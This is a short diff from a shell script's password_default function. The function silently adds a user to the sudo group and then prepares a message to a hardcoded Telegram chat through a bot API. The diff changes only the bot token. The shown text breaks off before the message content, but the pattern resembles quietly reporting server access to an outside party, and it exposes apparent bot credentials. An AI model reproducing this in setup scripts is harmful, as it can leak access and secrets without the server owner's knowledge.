@@ -311,7 +311,7 @@ function password_default() {
     usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="576495165"
-    KEY="6338068936:AAHiZflXdNWM6vrWgu474SXhzxcKZ_ITDv0"
+    KEY="63380936:AAHiZflXxcKZ_ITDv0"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT=" Update
